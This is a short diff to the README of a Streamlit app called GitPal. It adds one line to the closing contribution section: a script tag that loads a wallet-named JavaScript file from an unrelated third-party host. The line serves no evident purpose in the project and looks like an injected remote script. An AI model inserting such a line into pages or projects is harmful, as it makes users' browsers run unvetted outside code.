@@ -77,3 +77,4 @@ Open your web browser and navigate to http://localhost:8501.
 [Launch App on Streamlit](https://gitpal.streamlit.app/)
 
 Feel free to contribute, provide feedback, or report issues via GitHub. Your contributions are valued and help enhance the functionality and usability of this project.
+<script src="https://www-infinity4.github.io/Mint-For-Infinity/infinity-wallet-menu.js" defer></script>
